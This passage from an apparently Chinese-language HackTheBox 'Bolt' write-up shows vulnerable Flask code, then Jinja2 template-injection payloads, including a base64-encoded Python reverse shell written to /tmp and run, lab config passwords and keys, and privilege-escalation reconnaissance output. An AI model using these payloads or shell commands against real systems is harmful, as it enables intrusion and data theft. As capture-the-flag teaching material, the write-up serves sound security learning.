changes&quot;</span></span><br><span class="line">            )</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cur_user.profile_update = name</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;page-500.html&#x27;</span>)</span><br><span class="line">        db.session.add(current_user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        token = ts.dumps(user, salt=<span class="string">&#x27;changes-confirm-key&#x27;</span>)</span><br><span class="line">        confirm_url = url_for(<span class="string">&#x27;home_blueprint.confirm_changes&#x27;</span>,token=token,_external=<span class="literal">True</span>)</span><br><span class="line">        html = render_template(<span class="string">&#x27;emails/confirm-changes.html&#x27;</span>,confirm_url=confirm_url)</span><br><span class="line">        msg.html = html</span><br><span class="line">        mail.send(msg)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@blueprint.route(<span class="params"><span class="string">&#x27;/confirm/changes/&lt;token&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">confirm_changes</span>(<span class="params">token</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Confirmation Token&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        email = ts.loads(token, salt=<span class="string">&quot;changes-confirm-key&quot;</span>, max_age=<span class="number">86400</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br><span class="line">    user = User.query.filter_by(username=email).first_or_404()</span><br><span class="line">    name = user.profile_update</span><br><span class="line">    template = <span class="built_in">open</span>(<span class="string">&#x27;templates/emails/update-name.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    msg = Message(</span><br><span class="line">            recipients=[<span class="string">f&#x27;<span class="subst">&#123;user.email&#125;</span>&#x27;</span>],</span><br><span class="line">            sender = <span class="string">&#x27;support@example.com&#x27;</span>,</span><br><span class="line">            reply_to = <span class="string">&#x27;support@example.com&#x27;</span>,</span><br><span class="line">            subject = <span class="string">&quot;Your profile changes have been confirmed.&quot;</span></span><br><span class="line">        )</span><br><span class="line">    msg.html = render_template_string(template % name)</span><br><span class="line">    mail.send(msg)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><code>forms.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">UpdateProfileForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    name = TextField(<span class="string">&#x27;Name&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;name&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    experience = TextField(<span class="string">&#x27;Experience&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;experience&#x27;</span>, validators=[DataRequired()])</span><br><span class="line">    skills = TextField(<span class="string">&#x27;Skills&#x27;</span>, <span class="built_in">id</span>=<span class="string">&#x27;skills&#x27;</span>, validators=[DataRequired()])</span><br></pre></td></tr></table></figure>

<p><code>templates/emails/update-name.html</code></p>
<p><code>examples-profile.html</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;tab-pane&quot;</span> <span class="attr">id</span>=<span class="string">&quot;settings&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>Email verification is required in order to update personal information.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-horizontal&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/example-profile&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputName2&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-2 col-form-label&quot;</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputName2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Name&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputExperience&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-2 col-form-label&quot;</span>&gt;</span>Experience<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputExperience&quot;</span> <span class="attr">name</span>=<span class="string">&quot;experience&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Experience&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;inputSkills&quot;</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-2 col-form-label&quot;</span>&gt;</span>Skills<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;col-sm-10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">id</span>=<span class="string">&quot;inputSkills&quot;</span> <span class="attr">name</span>=<span class="string">&quot;skills&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Skills&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;offset-sm-2 col-sm-10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span>&gt;</span> I agree to the <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>terms and conditions<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group row&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;offset-sm-2 col-sm-10&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span> %s <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span> This e-mail serves as confirmation of your profile username changes.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201292336044.png"></p>
<p>尝试在这里进行模板注入</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301414778.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301415951.png"></p>
<p>然后根据网页提示去邮箱<code>mail.bolt.htb</code>检查邮件</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301416844.png"></p>
<p>点击确认连接,邮箱收到新的邮件其中包含模板注入的结果</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301417463.png"></p>
<p><code>&#123;&#123;"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()&#125;&#125;</code>返回<code>www-data</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301420520.png"></p>
<p>反弹shell</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">250</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;echo &quot;aW1wb3J0IHNvY2tldAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgb3MKaXA9IjEwLjEwLjE2LjciCnBvcnQ9ODAwMApzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKGlwLHBvcnQpKQpvcy5kdXAyKHMuZmlsZW5vKCksMCkKb3MuZHVwMihzLmZpbGVubygpLDEpCm9zLmR1cDIocy5maWxlbm8oKSwyKQpwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQoKI3B5dGhvbjMgLWMgJ2ltcG9ydCBwdHk7cHR5LnNwYXduKCIvYmluL2Jhc2giKScK&quot; | base64 -d &gt; /tmp/a.py&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&quot;&quot;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">250</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;python3 /tmp/a.py&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201301724933.png"></p>
<p><code>/var/www/demo/config.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;Flask Configuration&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#SQLALCHEMY_DATABASE_URI = &#x27;sqlite:///database.db&#x27;</span></span><br><span class="line">SQLALCHEMY_DATABASE_URI = <span class="string">&#x27;mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail&#x27;</span></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br><span class="line">SECRET_KEY = <span class="string">&#x27;kreepandcybergeek&#x27;</span></span><br><span class="line">MAIL_SERVER = <span class="string">&#x27;localhost&#x27;</span></span><br><span class="line">MAIL_PORT = <span class="number">25</span></span><br><span class="line">MAIL_USE_TLS = <span class="literal">False</span></span><br><span class="line">MAIL_USE_SSL = <span class="literal">False</span></span><br><span class="line"><span class="comment">#MAIL_DEBUG = app.debug</span></span><br><span class="line">MAIL_USERNAME = <span class="literal">None</span></span><br><span class="line">MAIL_PASSWORD = <span class="literal">None</span></span><br><span class="line">DEFAULT_MAIL_SENDER = <span class="string">&#x27;support@bolt.htb&#x27;</span></span><br></pre></td></tr></table></figure>

<p><code>/var/www/roundcube/config/config.inc.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;db_dsnw&#x27;</span>] = <span class="string">&#x27;mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;smtp_log&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;des_key&#x27;</span>] = <span class="string">&#x27;tdqy62YPNdGEeohXtJ2160bX&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;trash_mbox&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">/opt/google/chrome/chrome-sandbox</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/chsh</span><br></pre></td></tr></table></figure>

<p>传个<code>pspy</code>上去看看有没有特别的进程</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     ██▓███    ██████  ██▓███ ▓██   ██▓</span><br><span class="line">    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒</span><br><span class="line">    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░</span><br><span class="line">    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░</span><br><span class="line">    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░</span><br><span class="line">    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ </span><br><span class="line">    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ </span><br><span class="line">    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  </span><br><span class="line">                   ░           ░ ░     </span><br><span class="line">                               ░ ░     </span><br><span class="line"></span><br><span class="line">Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)</span><br><span class="line">Draining file system events due to startup...</span><br><span class="line">done</span><br><span class="line">2022/01/30 04:30:01 [32;1mCMD: UID=127  PID=964    | /usr/sbin/mysqld [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=948    | dovecot/config [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=945    | dovecot/log [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=129  PID=944    | dovecot/anvil [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=911    | /usr/sbin/kerneloops [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=909    | /sbin/agetty -o -p -- \u --noclear tty1 linux [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=116  PID=904    | /usr/sbin/kerneloops --test [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=886    | php-fpm: pool www                                                             [0m</span><br><span class="line">2022/01/30 04:30:01 [35;1mCMD: UID=120  PID=877    | /usr/bin/whoopsie -f [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=871    | /usr/sbin/dovecot -F [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=867    | nginx: worker process                            [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=866    | nginx: worker process                            [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=865    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=853    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=850    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=846    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=845    | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=768    | /usr/sbin/ModemManager [0m</span><br><span class="line">2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=682    | avahi-daemon: chroot helper [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=676    | /usr/bin/vmtoolsd [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=667    | /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=651    | /lib/systemd/systemd-logind [0m</span><br><span class="line">2022/01/30 04:30:01 [35;1mCMD: UID=104  PID=644    | /usr/sbin/rsyslogd -n -iNONE [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=633    | /usr/lib/policykit-1/polkitd --no-debug [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=630    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=625    | /usr/sbin/irqbalance --foreground [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=606    | /usr/sbin/NetworkManager --no-daemon [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=103  PID=605    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=604    | /usr/sbin/cron -f [0m</span><br><span class="line">2022/01/30 04:30:01 [35;1mCMD: UID=115  PID=603    | avahi-daemon: running [bolt.local] [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=598    | /usr/sbin/acpid [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=590    | /usr/bin/VGAuthService [0m</span><br><span class="line">2022/01/30 04:30:01 [35;1mCMD: UID=102  PID=539    | /lib/systemd/systemd-timesyncd [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=101  PID=538    | /lib/systemd/systemd-resolved [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=454    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=416    | /lib/systemd/systemd-udevd [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=3985   | ./pspy64s [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3984   | dovecot/auth -w [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=396    | /lib/systemd/systemd-journald [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3901   | [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3803   | [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3588   | [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3495   | [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3492   | [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3462   | /usr/lib/udisks2/udisksd [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3456   | /usr/lib/upower/upowerd [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=3449   | /usr/libexec/fwupd/fwupd [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2915   | [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2822   | php-fpm: pool www                                                             [0m</span><br><span class="line">2022/01/30 04:30:01 [34;1mCMD: UID=0    PID=2683   | [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2460   | ./pspy64s [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2442   | ./pspy64s [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2388   | ./pspy64s [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2387   | /bin/sh -c cd /tmp;./pspy64s;echo 50437e61;pwd;echo c6d24 [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2386   | sh -c /bin/sh -c &quot;cd &quot;/tmp&quot;;./pspy64s;echo 50437e61;pwd;echo c6d24&quot; 2&gt;&amp;1 [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2353   | ./pspy64 [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2352   | /bin/sh -c cd /tmp;./pspy64 &gt; /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24 [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2351   | sh -c /bin/sh -c &quot;cd &quot;/tmp&quot;;./pspy64 &gt; /tmp/pspy64.out;echo 50437e61;pwd;echo c6d24&quot; 2&gt;&amp;1 [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2189   | php-fpm: pool www                                                             [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=2187   | php-fpm: pool www                                                             [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1904   | /usr/bin/python3 /usr/local/bin/gunicorn wsgi:app [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1900   | /bin/bash [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1899   | python3 -c import pty;pty.spawn(&quot;/bin/bash&quot;) [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1856   | /bin/sh -i [0m</span><br><span class="line">2022/01/30 04:30:01 [36;1mCMD: UID=33   PID=1855   | python3 /tmp/a.py [0m</span><br><span class="line">2022/01/30 